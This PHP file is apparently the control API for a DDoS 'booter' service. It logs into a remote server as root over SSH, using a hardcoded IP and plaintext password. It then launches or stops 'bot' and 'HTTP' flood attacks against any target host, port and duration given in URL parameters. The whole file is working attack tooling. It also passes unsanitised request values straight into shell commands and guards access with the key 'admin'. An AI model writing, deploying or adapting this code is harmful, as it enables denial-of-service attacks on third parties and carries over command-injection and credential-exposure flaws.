<?php

function generateRandomString($length = 5) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}



//made by @Psychadelix

//$db = new mysqli("localhost", "root", "", "api-logs");

//if (mysqli_connect_errno()) {
//   printf("Connect failed: %s\n", mysqli_connect_error());
//  exit();
//}

$serverip = "88.198.204.8"; //it is not recommended to host the api on the same server it runs the commands on.
$port = "22";

$name = "root"; //we do not suggest using root.
$pass = "Runescapex@1"; //make sure you set a strong password.


//Check if the ssh2 function exists. If not kill the process.
if (!function_exists("ssh2_connect"))  /* -> Kill the process if php ssh2 can't be found. */  die("function ssh2_connect not found.");

if (!function_exists("curl_init"))  /* -> Kill the process if php ssh2 can't be found. */  die("could not find php7.0-curl. apt install php7.0-curl");

//attempt to connect to the server.
if (!($con = ssh2_connect($serverip, $port))){
    die('Connection to '. $serverip .' has failed. are you sure it has ssh2 installed?');
}
else{

    //verify logins
    if(!ssh2_auth_password($con, $name, $pass)) {
        print('Authencation failed to: '. $serverip .' '. $port .' '. $name .' '. $pass .' ');

    }
    else{

        //You're logged in here. Time for action.

        $command = $_GET['command'];

        if (empty($_GET['command'])){
            print('No command defined to execute.');
        }
        else{

            $key = array("admin");

            if(in_array($_GET['key'], $key)){
                switch($command){


                    //https://example.com/api.php?command=ldap&key=admin&host=1.1.1.1&port=80&time=60


                    case 'bot':

                        $host = $_GET['target'];
                        $port = $_GET['port'];
                        $time = $_GET['time'];
                        $version = $_GET['version'];
                        $threads = $_GET['threads'];
                        $mode = $_GET['mode'];

                        if (empty($host) || empty($port) || empty($time) || empty($version) || empty($threads) || empty($mode)){
                            die('You have not specified proper attack arguments.');
                        }

                        if (!($stream = ssh2_exec($con, "screen -dmS '.$host.' php attack_handler.php $host $port $time $version $threads $mode"))){
                            print $command . " " . "failed to execute..";
                            die();
                        } else {
                            echo "Attack has started on $host:$port using version $version for $time seconds.";
                            exit();
                        }
                        break;

                    case "HTTP":
                            $host = $_GET['target'];
                            $time = $_GET['time'];

                            if ($host && $time) {
                                if (!($stream = ssh2_exec($con, "screen -dmS '.$time.' php flood.php 3 $host $time cf.txt"))){
                                    echo "Failed to start attack";
                                    exit();
                                } else {
                                    echo $stream;
                                    exit();
                                }
                            } else {
                                die("No input specified for HTTP attack.");
                            }
                    break;

                    case 'stop':
                        $host = $_GET['host'];
                        if ($host){

                            if (!($stream = ssh2_exec($con, "screen -XS $host"))){
                                echo "attack not stopped";
                                exit();
                            } else {
                                echo "Attack on $host has been stopped.";
                                exit();
                            }

                        } else {
                            die('No host specified to stop attack on.');
                        }

                    break;


                    //throw this when the specified command is invalid.
                    default :
                        echo "Command:" . " " . $command . " " . "Not found";
                        break;
                }
            }
            else{
                print('Invalid key defined. Attempt logged.'); //this message shows when an invalid key has been specified.


                // $sql = $db->query(""); //finish this later.
            }
        }
    }
}
?>

